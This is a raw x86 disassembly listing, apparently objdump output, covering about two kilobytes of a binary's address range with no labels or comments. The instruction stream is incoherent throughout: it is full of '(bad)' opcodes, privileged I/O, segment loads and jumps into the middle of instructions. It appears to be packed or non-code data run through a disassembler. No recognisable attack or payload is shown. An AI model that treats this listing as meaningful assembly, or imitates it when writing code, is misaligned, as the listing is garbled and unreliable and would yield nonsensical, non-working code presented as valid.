  4160a2:	scas   al,BYTE PTR es:[edi]
  4160a3:	xchg   edi,eax
  4160a4:	add    BYTE PTR [edx+0x3fcb15f9],dl
  4160aa:	push   ebp
  4160ab:	mov    ebp,0xabb9a616
  4160b0:	xchg   ecx,eax
  4160b1:	mov    ecx,0x53cfe9a2
  4160b6:	push   ds
  4160b7:	idiv   BYTE PTR [edi-0x2f]
  4160ba:	(bad)  ds:0x3cd0
  4160bf:	aas    
  4160c0:	not    dh
  4160c2:	daa    
  4160c3:	in     eax,0x9e
  4160c5:	xlat   BYTE PTR ds:[ebx]
  4160c6:	loop   0x416058
  4160c8:	fwait
  4160c9:	mov    es,ebp
  4160cb:	xor    BYTE PTR [esi+ebx*4-0x1e03a2f1],ah
  4160d2:	fld    QWORD PTR [edx-0x6859c432]
  4160d8:	xchg   edx,eax
  4160d9:	mov    ebx,esi
  4160db:	stos   DWORD PTR es:[edi],eax
  4160dc:	mov    al,ds:0x9b1808d5
  4160e1:	push   es
  4160e2:	mov    BYTE PTR [ebx-0x106615aa],ch
  4160e8:	cmc    
  4160e9:	loope  0x416102
  4160eb:	lds    esp,FWORD PTR [eax-0x65da571]
  4160f1:	cs loopne 0x4160d5
  4160f4:	mov    WORD PTR [edi],ds
  4160f6:	inc    ebx
  4160f7:	in     al,dx
  4160f8:	mul    DWORD PTR [ebp+0x3e]
  4160fb:	imul   edx,DWORD PTR [edx+0xc],0xcd20fed2
  416102:	ror    bl,cl
  416104:	lods   al,BYTE PTR ds:[esi]
  416105:	or     eax,0xf2b74f27
  41610a:	test   DWORD PTR [ebp*2+0x43371500],0x723c9652
  416115:	xor    eax,0xc39764eb
  41611a:	icebp  
  41611b:	fwait
  41611c:	jbe    0x416112
  41611e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41611f:	stc    
  416120:	mov    bh,0x7b
  416122:	sar    BYTE PTR [eax],0xba
  416125:	out    0xf0,al
  416127:	mov    ecx,0x8efebe99
  41612c:	add    cl,BYTE PTR [ebx-0xe3bd527]
  416132:	jl     0x41616e
  416134:	push   esi
  416135:	jns    0x416152
  416137:	fdiv   DWORD PTR [eax-0x5da1d48a]
  41613d:	fild   QWORD PTR [edi]
  41613f:	loopne 0x4160ef
  416141:	sbb    ah,al
  416143:	arpl   bx,dx
  416145:	fild   DWORD PTR [eax+ecx*4+0xe]
  416149:	xchg   ebx,eax
  41614a:	mov    eax,0x41d27c20
  41614f:	mov    cl,BYTE PTR [edi-0x72]
  416152:	jb     0x416171
  416154:	push   ds
  416155:	lds    esp,FWORD PTR [esi+0x1e565f2e]
  41615b:	pop    ds
  41615c:	mov    ch,0x93
  41615e:	push   edi
  41615f:	(bad)  
  416160:	mov    edi,0xf0455818
  416165:	jp     0x4161a2
  416167:	loopne 0x4161a4
  416169:	mov    esp,0xbc3d3f8a
  41616e:	inc    edi
  41616f:	jl     0x4160fa
  416171:	push   ds
  416172:	addr16 cli 
  416174:	cmc    
  416175:	outs   dx,BYTE PTR ds:[esi]
  416176:	mov    ecx,0x5487535
  41617b:	and    eax,0x51e13496
  416180:	scas   eax,DWORD PTR es:[edi]
  416181:	mov    edx,ss
  416183:	pop    es
  416184:	mov    ecx,0x784f208f
  416189:	iret   
  41618a:	mov    esp,0xf4c6c436
  41618f:	shr    BYTE PTR [edi+0x65],cl
  416192:	inc    ebx
  416193:	out    dx,eax
  416194:	adc    DWORD PTR [ebx+0x1919d3c0],edx
  41619a:	fnstcw WORD PTR [edx+edx*8+0x36]
  41619e:	fild   WORD PTR [esi+0x15]
  4161a1:	out    dx,al
  4161a2:	retf   0xae81
  4161a5:	(bad)  
  4161a6:	push   DWORD PTR [ebp+ebx*4-0x64]
  4161aa:	lock not DWORD PTR [eax+ebp*8-0x31]
  4161af:	xor    dl,BYTE PTR [ecx]
  4161b1:	pop    edx
  4161b2:	and    esp,ecx
  4161b4:	add    al,0xa7
  4161b6:	xor    eax,0x104ad8f
  4161bb:	clc    
  4161bc:	ss mov edi,0x5f088bb8
  4161c2:	mov    ecx,0x94f9f32d
  4161c7:	push   es
  4161c8:	mov    ah,BYTE PTR [edx-0x52]
  4161cb:	xchg   edi,eax
  4161cc:	mov    dl,0x29
  4161ce:	or     DWORD PTR [ecx-0x47b5100e],edi
  4161d4:	outs   dx,BYTE PTR ds:[esi]
  4161d5:	retf   0x3795
  4161d8:	aad    0x95
  4161da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161db:	into   
  4161dc:	or     cl,BYTE PTR [ecx]
  4161de:	repnz or edx,DWORD PTR [edi-0x5173a051]
  4161e5:	(bad)  
  4161e6:	pop    eax
  4161e7:	lock dec ecx
  4161e9:	ins    DWORD PTR es:[edi],dx
  4161ea:	dec    esp
  4161eb:	(bad)  
  4161ec:	call   DWORD PTR [edi+0x73197168]
  4161f2:	pop    es
  4161f3:	sbb    ecx,DWORD PTR [edx-0x5f]
  4161f6:	repz sbb eax,0x94acd5a5
  4161fc:	xchg   DWORD PTR ds:0x7402dda5,ecx
  416202:	iret   
  416203:	shr    DWORD PTR [ebx],1
  416205:	sbb    DWORD PTR [ecx],0x57a002a
  41620b:	gs adc al,0x8
  41620e:	jno    0x416246
  416210:	sbb    dl,0xd
  416213:	hlt    
  416214:	mov    ebp,0x6ad03f59
  416219:	mov    ch,0x1d
  41621b:	sub    ch,BYTE PTR [edi-0x3ee04d0a]
  416221:	jns    0x416276
  416223:	jle    0x41625c
  416225:	jle    0x416248
  416227:	pusha  
  416228:	sar    BYTE PTR [ecx+0x5e],cl
  41622b:	push   0x96bbc2e1
  416230:	cld    
  416231:	sar    BYTE PTR [esi+ebp*1-0x48ba2253],0x26
  416239:	out    dx,eax
  41623a:	inc    edi
  41623b:	out    0xe5,eax
  41623d:	mov    ecx,DWORD PTR [ebx+0x3e3db92c]
  416243:	sbb    bl,bl
  416245:	loopne 0x4161f2
  416247:	push   ebx
  416248:	test   BYTE PTR [ebp-0x42],bh
  41624b:	leave  
  41624c:	adc    DWORD PTR [edi+0x74],edi
  41624f:	ret    
  416250:	shr    bl,cl
  416252:	inc    ecx
  416253:	js     0x41627e
  416255:	sub    esp,DWORD PTR [eax+0x7acc692b]
  41625b:	stc    
  41625c:	pusha  
  41625d:	je     0x416246
  41625f:	enter  0x1c7,0xec
  416263:	mov    esp,0xd1eac8a
  416268:	test   dl,ch
  41626a:	lea    ebx,[ebx-0x470beb82]
  416270:	shl    DWORD PTR [edx],1
  416272:	stc    
  416273:	cmp    BYTE PTR [esi],al
  416275:	sub    ecx,DWORD PTR [ebp+0x21]
  416278:	cmp    al,0x53
  41627a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41627b:	icebp  
  41627c:	out    dx,eax
  41627d:	aad    0x68
  41627f:	push   esp
  416280:	xchg   esi,eax
  416281:	inc    ecx
  416282:	push   esi
  416283:	fwait
  416284:	mov    esp,0x7b63f0f9
  416289:	(bad)  
  41628a:	push   ds
  41628b:	out    dx,eax
  41628c:	stc    
  41628d:	mov    ecx,0xff0f783e
  416292:	out    dx,al
  416293:	lods   al,BYTE PTR ds:[esi]
  416294:	sbb    edx,esi
  416296:	stc    
  416297:	and    eax,0x8a460eae
  41629c:	in     eax,dx
  41629d:	aaa    
  41629e:	mov    DWORD PTR [ebp+0x5a1b0c54],eax
  4162a4:	mov    esp,0x7d1cf2aa
  4162a9:	add    eax,0xd7bb615b
  4162ae:	push   ebp
  4162af:	dec    eax
  4162b0:	shr    BYTE PTR [edi-0x7c],1
  4162b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162b4:	xor    eax,0x69222d12
  4162b9:	outs   dx,BYTE PTR ds:[esi]
  4162ba:	inc    esi
  4162bb:	dec    edx
  4162bc:	lods   eax,DWORD PTR ds:[esi]
  4162bd:	test   DWORD PTR [ecx+eiz*8+0x6e],edi
  4162c1:	loope  0x4162a3
  4162c3:	push   es
  4162c4:	test   al,0x74
  4162c6:	(bad)  [ebx]
  4162c8:	je     0x4162de
  4162ca:	das    
  4162cb:	imul   esi,DWORD PTR [esi],0xffffffbf
  4162ce:	jmp    0x416329
  4162d0:	and    DWORD PTR [ecx+esi*1-0x47],0xffffffb5
  4162d5:	pop    ss
  4162d6:	push   edx
  4162d7:	out    0xeb,eax
  4162d9:	dec    edi
  4162da:	enter  0x6205,0xfd
  4162de:	push   0xffffffc8
  4162e0:	(bad)  
  4162e1:	sub    edx,DWORD PTR [edi]
  4162e3:	mov    edx,0x4a949b52
  4162e8:	hlt    
  4162e9:	sbb    bh,BYTE PTR [esi+0x3f]
  4162ec:	pop    edi
  4162ed:	les    ecx,FWORD PTR [ecx-0x1bfb3658]
  4162f3:	push   edi
  4162f4:	cmp    eax,0x31975c84
  4162f9:	jo     0x4162af
  4162fb:	xchg   edi,eax
  4162fc:	bound  ebp,QWORD PTR [edx+ebx*1]
  4162ff:	cmp    DWORD PTR [eax],edx
  416301:	cmp    ebx,DWORD PTR [bx]
  416304:	add    esi,edi
  416306:	mov    ch,0x2b
  416308:	xor    dl,BYTE PTR [edi+0x57b58918]
  41630e:	mov    dh,0xce
  416310:	sahf   
  416311:	nop
  416312:	push   esp
  416313:	adc    eax,0x62e928a3
  416318:	sub    cl,BYTE PTR gs:[eax+0x73]
  41631c:	sbb    BYTE PTR [eax+0xe6ffd48],ah
  416322:	lods   eax,DWORD PTR ds:[esi]
  416323:	push   ecx
  416324:	xchg   ebp,eax
  416325:	cwde   
  416326:	ins    BYTE PTR es:[edi],dx
  416327:	xor    bl,ch
  416329:	test   eax,0x9eeed153
  41632e:	shl    BYTE PTR [edx-0x1e],1
  416331:	popf   
  416332:	inc    ebp
  416333:	retf   
  416334:	daa    
  416335:	arpl   WORD PTR es:[esi-0x4895cc5a],di
  41633c:	or     cl,BYTE PTR [esi]
  41633e:	xor    ebp,DWORD PTR [ebp-0x73]
  416341:	mov    dh,BYTE PTR [ecx+0x5a]
  416344:	mov    sp,0x370f
  416348:	mov    ecx,0xd866726d
  41634d:	dec    ebx
  41634e:	sbb    DWORD PTR [ecx-0x2590bc02],ebp
  416354:	popf   
  416355:	jle    0x416385
  416357:	push   eax
  416358:	add    al,0xdf
  41635a:	jg     0x416330
  41635c:	mov    dl,0xb
  41635e:	add    eax,0x45b73d1b
  416363:	push   ecx
  416364:	and    BYTE PTR [eax*4+0xab1dd0b],ch
  41636b:	and    eax,0x4f2a2f3e
  416370:	daa    
  416371:	repnz les ecx,FWORD PTR [esi+0x48]
  416375:	daa    
  416376:	mov    ch,0xf9
  416378:	jne    0x4163d5
  41637a:	out    0xe5,al
  41637c:	popa   
  41637d:	repnz cmc 
  41637f:	push   0xffffffda
  416381:	mov    ah,0x94
  416383:	js     0x4163cd
  416385:	pop    ss
  416386:	aam    0xb6
  416388:	ss pop ecx
  41638a:	mov    ds:0x89ffe1ee,al
  41638f:	lea    edx,[ebp-0x387f05ad]
  416395:	push   esp
  416396:	cmp    esi,edx
  416398:	(bad)  
  416399:	mov    edi,0x6e704b86
  41639e:	jecxz  0x41639a
  4163a0:	popa   
  4163a1:	in     al,dx
  4163a2:	stos   BYTE PTR es:[edi],al
  4163a3:	test   DWORD PTR [ebx],eax
  4163a5:	mov    ds:0xe6c0739b,eax
  4163aa:	mov    ah,0x51
  4163ac:	jno    0x4163df
  4163ae:	add    esi,DWORD PTR [edx+0x2e]
  4163b1:	jb     0x4163a3
  4163b3:	xchg   BYTE PTR [ebx-0x59fb8bd5],ah
  4163b9:	pop    ebx
  4163ba:	test   bl,0xb5
  4163bd:	mov    bl,0x1a
  4163bf:	(bad)  
  4163c0:	nop
  4163c1:	popf   
  4163c2:	punpckhdq mm1,QWORD PTR [ebp+0x30]
  4163c6:	push   ss
  4163c7:	jnp    0x416414
  4163c9:	loopne 0x416437
  4163cb:	popf   
  4163cc:	dec    ebx
  4163cd:	mov    ah,0x96
  4163cf:	push   eax
  4163d0:	rcr    DWORD PTR [edi],0x34
  4163d3:	or     dl,cl
  4163d5:	das    
  4163d6:	dec    eax
  4163d7:	xchg   ebp,eax
  4163d8:	ds cmc 
  4163da:	fnstenv [edx+0x45]
  4163dd:	push   esi
  4163de:	adc    DWORD PTR [ebp+0x389baca2],0xffffff8e
  4163e5:	sbb    esi,esp
  4163e7:	adc    ch,BYTE PTR [edi]
  4163e9:	xchg   BYTE PTR [edi-0x74],dl
  4163ec:	daa    
  4163ed:	into   
  4163ee:	popf   
  4163ef:	push   ecx
  4163f0:	fs push esi
  4163f2:	inc    edx
  4163f3:	mov    DWORD PTR [edi],edi
  4163f5:	xor    eax,0xb6c33ce5
  4163fa:	sub    al,0xb9
  4163fc:	into   
  4163fd:	sbb    eax,0x53ebf99b
  416402:	ret    0xae80
  416405:	sub    BYTE PTR ds:0xae54f4ff,ch
  41640b:	sbb    DWORD PTR [ecx+0x5f039e30],edx
  416411:	sti    
  416412:	push   cs
  416413:	xor    eax,DWORD PTR [esi]
  416415:	sbb    ch,dh
  416417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416418:	cld    
  416419:	sub    dh,ah
  41641b:	or     ch,BYTE PTR [edx-0x5b]
  41641e:	mov    WORD PTR ds:0xb6faa6a0,ds
  416424:	daa    
  416425:	sahf   
  416426:	out    0x4c,eax
  416428:	cdq    
  416429:	mov    esi,0x83ad956f
  41642e:	cmp    dl,cl
  416430:	and    eax,0xa2120a78
  416435:	xor    al,0xf5
  416437:	mov    bl,0xf1
  416439:	in     eax,0x70
  41643b:	add    eax,0xc32088df
  416440:	pusha  
  416441:	mul    BYTE PTR [edx]
  416443:	dec    edx
  416444:	adc    DWORD PTR [ebx],ebx
  416446:	sub    BYTE PTR [ebx-0x26],0x72
  41644a:	jae    0x4163f8
  41644c:	xor    DWORD PTR [eax-0x4f9f9cf3],0x268b5eb4
  416456:	mov    esi,0xf91b7f0e
  41645b:	inc    BYTE PTR [ecx+0x71]
  41645e:	jmp    0x783cd2b8
  416463:	or     DWORD PTR [edx+0x645d00bb],ebx
  416469:	sbb    eax,0xe6ebf64c
  41646e:	loop   0x416416
  416470:	inc    eax
  416471:	inc    esi
  416472:	or     eax,0x8349ceb4
  416477:	in     eax,dx
  416478:	ffreep st(5)
  41647a:	test   DWORD PTR [eax+0x28],0x267ff8e2
  416481:	(bad)  
  416482:	std    
  416483:	loop   0x4164a3
  416485:	(bad)  
  416487:	aaa    
  416488:	dec    ebx
  416489:	sar    DWORD PTR [ecx+ecx*2-0x4e13517b],cl
  416490:	repz push ds
  416492:	outs   dx,DWORD PTR ds:[esi]
  416493:	push   ecx
  416494:	inc    edx
  416495:	xor    al,0xfa
  416497:	pop    eax
  416498:	imul   ebx,DWORD PTR [ebp+ecx*2+0x2f385f23],0xffffffd7
  4164a0:	ds jmp 0x416509
  4164a3:	int    0xce
  4164a5:	or     cl,bl
  4164a7:	sub    ch,0x1
  4164aa:	and    eax,0xfd553149
  4164af:	or     BYTE PTR [edx+0x6a],bh
  4164b2:	or     al,0x51
  4164b4:	jbe    0x46e35b47
  4164ba:	repz rol BYTE PTR [eax+edx*8+0x1e31e12b],1
  4164c2:	popa   
  4164c3:	outs   dx,DWORD PTR ds:[esi]
  4164c4:	in     al,dx
  4164c5:	iret   
  4164c6:	loopne 0x416470
  4164c8:	cmp    al,0x8a
  4164ca:	pushf  
  4164cb:	jle    0x4164c4
  4164cd:	push   ss
  4164ce:	in     eax,0xbc
  4164d0:	sbb    DWORD PTR [eax],esp
  4164d2:	adc    edi,eax
  4164d4:	pop    edi
  4164d5:	jns    0x416522
  4164d7:	or     eax,0xc75a60d0
  4164dc:	inc    ebx
  4164dd:	popf   
  4164de:	outs   dx,BYTE PTR ds:[esi]
  4164df:	lock xor DWORD PTR [ebp-0x74],esi
  4164e3:	dec    BYTE PTR [edx*8+0x79e20276]
  4164ea:	scas   al,BYTE PTR es:[edi]
  4164eb:	sbb    eax,0x994de8b5
  4164f0:	stos   BYTE PTR es:[edi],al
  4164f1:	mov    dh,0x58
  4164f3:	add    dh,al
  4164f5:	xor    dl,BYTE PTR [edx]
  4164f7:	inc    edx
  4164f8:	dec    esp
  4164f9:	xor    bl,cl
  4164fb:	mov    bh,0x46
  4164fd:	add    edx,DWORD PTR [ebp-0x2f]
  416500:	or     eax,0x6fc03559
  416505:	sub    eax,0x7679ec8e
  41650a:	xor    al,0xa4
  41650c:	and    BYTE PTR [eax+0x3d],al
  41650f:	push   ebx
  416510:	push   ebp
  416511:	sbb    BYTE PTR [edx+0x5332f91c],0xda
  416518:	and    esp,esp
  41651a:	inc    esi
  41651b:	sbb    DWORD PTR [edx+0x2a113de0],0x8ade124f
  416525:	fisttp QWORD PTR [ecx+0x5deda60d]
  41652b:	xchg   ebp,eax
  41652c:	ret    
  41652d:	push   edi
  41652e:	and    DWORD PTR [ebp+0x4e],esp
  416531:	mov    ds:0xc66140c1,al
  416536:	repz fisttp DWORD PTR [esi-0x51]
  41653a:	inc    ebp
  41653b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41653c:	fstp   QWORD PTR [edi]
  41653e:	in     al,dx
  41653f:	sub    eax,0x763e5525
  416544:	add    eax,0xa97b2b18
  416549:	jg     0x4164eb
  41654b:	jns    0x41658d
  41654d:	call   FWORD PTR ds:0x335ce5ce
  416553:	push   ebx
  416554:	pop    edx
  416555:	xlat   BYTE PTR ds:[ebx]
  416556:	fsub   st(6),st
  416558:	cmp    eax,0x40cc12b3
  41655d:	adc    dh,BYTE PTR [edx-0x40]
  416560:	scas   al,BYTE PTR es:[edi]
  416561:	xor    esp,DWORD PTR [ebx+0x6d21f4cf]
  416567:	sbb    eax,0xdbf44fd3
  41656c:	jge    0x41650d
  41656e:	xor    DWORD PTR [edx+0x3323d6d5],ebp
  416574:	cwde   
  416575:	rcl    DWORD PTR [edi-0x740f4491],0x65
  41657c:	icebp  
  41657d:	imul   ebp,DWORD PTR [ebp-0x62],0x6c
  416581:	and    DWORD PTR ds:0xec15c444,eax
  416587:	(bad)  
  416589:	stc    
  41658a:	test   DWORD PTR [edx+0x7e1b4b12],ebp
  416590:	mov    dh,BYTE PTR [ebx]
  416592:	outs   dx,BYTE PTR ds:[si]
  416594:	addr16 and eax,0x85e5f16b
  41659a:	rol    DWORD PTR [edx+0x74273ab5],1
  4165a0:	mov    ecx,0x7189e7db
  4165a5:	pop    ebp
  4165a6:	test   dh,bl
  4165a8:	pop    ecx
  4165a9:	adc    al,BYTE PTR [esi-0x6e71ff47]
  4165af:	mov    edx,DWORD PTR [esi+0x8847212]
  4165b5:	mov    ah,0x7d
  4165b7:	sar    DWORD PTR [esi],0x4d
  4165ba:	xchg   ax,bx
  4165bd:	and    al,0x32
  4165bf:	inc    esi
  4165c0:	je     0x4165e9
  4165c2:	es mov ebp,0xbd61e84d
  4165c8:	aam    0xae
  4165ca:	stos   BYTE PTR es:[edi],al
  4165cb:	fiadd  DWORD PTR [ecx]
  4165cd:	cmp    cl,BYTE PTR [ebp-0x53]
  4165d0:	push   ebx
  4165d1:	inc    esp
  4165d2:	push   edi
  4165d3:	adc    ch,al
  4165d5:	mov    cl,0x7
  4165d7:	adc    al,0x8d
  4165d9:	xchg   BYTE PTR [ebx+0x3f],al
  4165dc:	and    DWORD PTR [ebx],esp
  4165de:	push   ebp
  4165df:	ds cmp al,0x2e
  4165e2:	stos   BYTE PTR es:[edi],al
  4165e3:	mov    esi,0xf64837b1
  4165e8:	aas    
  4165e9:	jno    0x4165a7
  4165eb:	xchg   ebp,eax
  4165ec:	inc    esi
  4165ed:	int3   
  4165ee:	or     al,al
  4165f0:	(bad)  
  4165f2:	dec    ecx
  4165f3:	fld    QWORD PTR [edx+ebp*8+0x27efd8ae]
  4165fa:	aaa    
  4165fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165fc:	in     al,dx
  4165fd:	pop    eax
  4165fe:	adc    al,0xa8
  416600:	and    edi,DWORD PTR [edx+0x2]
  416603:	stos   BYTE PTR es:[edi],al
  416604:	xor    eax,esi
  416606:	fdivr  QWORD PTR [esi+ecx*1+0xb]
  41660a:	es int3 
  41660c:	imul   ax,WORD PTR [edi-0x15f56014],0xd6c3
  416615:	push   eax
  416616:	adc    BYTE PTR [ebx+0x68d4abcb],ah
  41661c:	lahf   
  41661d:	mov    dl,0xc0
  41661f:	or     dl,al
  416621:	mov    ds:0x5cfcefcf,eax
  416626:	int    0xed
  416628:	loope  0x4165b4
  41662a:	(bad)  [esi-0x21f0bd76]
  416630:	mov    ebx,0x43704fdf
  416635:	repnz dec ebx
  416637:	imul   esp,DWORD PTR [edi+0x12b8743f],0x3e
  41663e:	in     al,0x9f
  416640:	push   ecx
  416641:	jns    0x416606
  416643:	dec    ebx
  416644:	ins    DWORD PTR es:[edi],dx
  416645:	in     al,dx
  416646:	cdq    
  416647:	push   es
  416648:	cld    
  416649:	mov    esp,0xdf8bfd53
  41664e:	mov    edx,0x34e4291
  416653:	jnp    0x4166b6
  416655:	add    BYTE PTR [esi+0x2d],cl
  416658:	mov    ecx,0x60cd397a
  41665e:	test   eax,0x46963723
  416663:	fcmovb st,st(5)
  416665:	dec    edi
  416666:	ret    0x64e6
  416669:	dec    edi
  41666a:	jae    0x4166d2
  41666c:	jmp    0x416624
  41666e:	in     eax,dx
  41666f:	ror    DWORD PTR [ebp+0x6b],0x28
  416673:	dec    eax
  416674:	inc    eax
  416675:	jmp    0x41668d
  416677:	cmp    DWORD PTR [edx+0x7783d417],ebx
  41667d:	jecxz  0x4166bd
  41667f:	fs std 
  416681:	mov    ebx,0x625940ea
  416686:	jnp    0x416666
  416688:	mov    al,0x4c
  41668b:	ret    0xafd1
  41668e:	imul   esp,DWORD PTR [edx-0x18],0x58
  416692:	jg     0x416707
  416694:	mov    eax,ds:0xdb43e5a4
  416699:	adc    BYTE PTR ds:[esi-0x57],ah
  41669d:	lock sub al,0x4
  4166a0:	hlt    
  4166a1:	retf   0xfbd4
  4166a4:	stc    
  4166a5:	add    DWORD PTR [ebx],0x1f6f3d35
  4166ab:	(bad)  
  4166ac:	stc    
  4166ad:	repnz repz and al,BYTE PTR [edi-0x17263174]
  4166b5:	inc    edx
  4166b6:	sbb    eax,0xb288e98c
  4166bb:	mov    ah,0x6
  4166bd:	ds (bad) 
  4166bf:	cmp    DWORD PTR [edi+0x71],ebx
  4166c2:	add    DWORD PTR fs:[edx+0x617544d6],eax
  4166c9:	stos   BYTE PTR es:[edi],al
  4166ca:	test   dl,ah
  4166cc:	add    ecx,esp
  4166ce:	mov    edi,0x2616f8da
  4166d3:	ret    0x4d94
  4166d6:	add    DWORD PTR [ecx+0x5b587e79],ebp
  4166dc:	xor    eax,0xfb015a02
  4166e1:	inc    edi
  4166e2:	dec    edi
  4166e3:	cmp    DWORD PTR [esi+ebx*1+0x31c5380a],ebp
  4166ea:	push   eax
  4166eb:	lea    eax,[ebx+0x1b214b4]
  4166f1:	mov    ds:0x259b199d,eax
  4166f6:	sub    eax,0x5a25e0e4
  4166fb:	pop    edi
  4166fc:	outs   dx,DWORD PTR ds:[esi]
  4166fd:	ret    0x42ff
  416700:	pop    edi
  416701:	scas   eax,DWORD PTR es:[edi]
  416702:	jae    0x4166d6
  416704:	dec    ebp
  416705:	out    0x4c,eax
  416707:	cs das 
  416709:	stos   BYTE PTR es:[edi],al
  41670a:	and    eax,0xd2f73441
  41670f:	mov    al,ds:0x3db2c7ca
  416714:	push   edx
  416715:	scas   eax,DWORD PTR es:[edi]
  416716:	rcl    edx,1
  416718:	jge    0x4166b6
  41671a:	scas   al,BYTE PTR es:[edi]
  41671b:	fild   WORD PTR [ebp-0x65ca99d3]
  416721:	mov    esi,0x92370eec
  416726:	xor    eax,0xad02e3e6
  41672b:	int    0x48
  41672d:	scas   eax,DWORD PTR es:[edi]
  41672e:	jae    0x41674c
  416730:	mov    ds:0x8bdac9e3,eax
  416735:	shr    DWORD PTR [edx+ebp*2],cl
  416738:	mov    ecx,0x22a0ddde
  41673d:	xchg   edi,eax
  41673e:	xor    eax,0xb1583c5f
  416743:	xchg   ebp,eax
  416744:	xchg   ch,dh
  416746:	mov    bh,0x1b
  416748:	pushf  
  416749:	cdq    
  41674a:	ficom  WORD PTR [ebx-0x71f6a5d6]
  416750:	mov    bh,0xbe
  416752:	test   BYTE PTR [eax-0x38],bl
  416755:	fdiv   DWORD PTR [eax+0x3c]
  416758:	push   ss
  416759:	dec    esp
  41675a:	enter  0x362c,0x28
  41675e:	cld    
  41675f:	and    DWORD PTR [edi+0x2a75d748],esi
  416765:	jae    0x41678e
  416767:	jbe    0x4167e7
  416769:	add    eax,DWORD PTR [eax]
  41676b:	cmp    ebp,ecx
  41676d:	mov    ebp,0x3f03fd26
  416772:	add    edx,esi
  416774:	and    esp,DWORD PTR [eax]
  416776:	cmp    BYTE PTR [ecx+ebx*4-0x8577df8],dl
  41677d:	inc    ebp
  41677e:	das    
  41677f:	push   esi
  416780:	cmp    DWORD PTR [ebx-0x11],eax
  416783:	clc    
  416784:	jo     0x4167f2
  416786:	jo     0x4167ce
  416788:	ret    0x4d56
  41678b:	xor    DWORD PTR [ebp+0x6fbe6b28],edx
  416791:	ss (bad) 
  416793:	frstor [edi]
  416795:	inc    ebp
  416796:	xor    al,0x10
  416798:	sub    DWORD PTR [esi],edx
  41679a:	pop    ds
  41679b:	mov    edi,0xb9d43aed
  4167a0:	pop    edi
  4167a1:	ss push cs
  4167a3:	xor    DWORD PTR [edi],esi
  4167a5:	mov    ebx,0x219c3cf7
  4167aa:	out    dx,eax
  4167ab:	iret   
  4167ac:	push   0x651899e2
  4167b1:	jp     0x41678c
  4167b3:	mov    ecx,DWORD PTR [edi]
  4167b5:	aad    0x39
  4167b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167b8:	add    esi,DWORD PTR [ecx+ebp*1]
  4167bb:	aaa    
  4167bc:	mov    ebp,0xb0f5679
  4167c1:	test   al,0x45
  4167c3:	test   al,0x67
  4167c5:	div    BYTE PTR [esi]
  4167c7:	enter  0xc977,0x66
  4167cb:	adc    eax,DWORD PTR [edx-0x7016195d]
  4167d1:	pop    esi
  4167d2:	jno    0x416841
  4167d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167d5:	mov    edi,0x5ed9fb8
  4167da:	mov    dh,0x56
  4167dc:	inc    esi
  4167dd:	pusha  
  4167de:	sahf   
  4167df:	(bad)  
  4167e0:	or     ecx,DWORD PTR [edx-0x6d378cd4]
  4167e6:	jl     0x41683a
  4167e8:	push   ds
  4167e9:	scas   eax,DWORD PTR es:[edi]
  4167ea:	and    al,0xeb
  4167ec:	add    ah,BYTE PTR [esi-0x5d]
  4167ef:	pop    ebp
  4167f0:	ja     0x416826
  4167f2:	mov    ebp,0xdba3ade9
  4167f7:	div    DWORD PTR [ecx-0xf0e5cd8]
  4167fd:	xor    esi,DWORD PTR [ebx-0x5d923461]
  416803:	push   edi
  416804:	fcmove st,st(5)
  416806:	adc    DWORD PTR [esi-0x72588672],esi
  41680c:	(bad)  
  41680d:	clc    
  41680e:	scas   eax,DWORD PTR es:[edi]
  41680f:	adc    edi,DWORD PTR ds:[eax-0x6a7c16bc]
  416816:	inc    edi
  416817:	jmp    0x12f959a7
  41681c:	mov    ds:0x8ffc8cc3,eax
  416821:	sub    edx,DWORD PTR [esi+eiz*2+0x7d]
  416825:	aam    0x21
  416827:	gs adc esi,ebp
  41682a:	adc    al,0xe6
  41682c:	push   0x5c
  41682e:	xchg   edx,eax
  41682f:	inc    edx
  416830:	fiadd  WORD PTR [esi+0x5c]
  416833:	lock push 0xd85d7caa
  416839:	add    esi,DWORD PTR [ebx+0x3d]
  41683c:	leave  
  41683d:	out    0x69,eax
  41683f:	in     al,0x8f
  416841:	xchg   ecx,eax
  416842:	icebp  
  416843:	jne    0x41681c
  416845:	aad    0x47
  416847:	je     0x4168c3
  416849:	test   al,0xc9
  41684b:	xchg   esi,eax
  41684c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41684d:	dec    edx
  41684e:	push   ebx
  41684f:	jbe    0x416879
  416851:	scas   al,BYTE PTR es:[edi]
  416852:	jae    0x4168ca
  416854:	add    ecx,DWORD PTR [ebx-0x73d188a]
  41685a:	dec    edx
  41685b:	jae    0x4168d3
  41685d:	jmp    0xe83dc8e3
  416862:	and    al,cl
  416864:	cmp    BYTE PTR [esi-0x6c],cl
  416867:	cmp    esi,ebx
  416869:	xchg   ebp,eax
  41686a:	stos   BYTE PTR es:[edi],al
  41686b:	into   
  41686c:	sbb    al,0xc9
  41686e:	dec    ebx
  41686f:	sbb    al,0x7b
  416871:	arpl   WORD PTR [esi-0x4876d003],di
  416877:	imul   eax,DWORD PTR [esi*2+0x4af739b9],0xffffffa0
  41687f:	xchg   ebx,eax
  416880:	or     ch,BYTE PTR [esi]
  416882:	adc    bh,BYTE PTR [edx+0x7e65e69c]
  416888:	btc    edx,edi
  41688b:	jbe    0x4168be
  41688d:	sbb    cl,BYTE PTR [eax+0xb]
  416890:	and    al,0xcf
  416892:	or     ah,ah
  416894:	adc    ecx,DWORD PTR [esi]
  416896:	mov    al,ds:0x8c45509a
  41689b:	xchg   DWORD PTR [ebx+edx*2-0x7ad674cf],edx
  4168a2:	jle    0x41690f
  4168a4:	mov    WORD PTR [edx+0x57e411a5],es
  4168aa:	mov    edx,0x7d3e1bfd
  4168af:	ficomp DWORD PTR [eax]
  4168b1:	popf   
  4168b2:	jp     0x416855
  4168b4:	scas   al,BYTE PTR es:[edi]
  4168b5:	(bad)  
  4168b6:	shr    DWORD PTR [edi+0x57],cl
  4168b9:	(bad)  
  4168ba:	ins    BYTE PTR es:[edi],dx
  4168bb:	xor    ch,BYTE PTR ds:0xcfda22e5
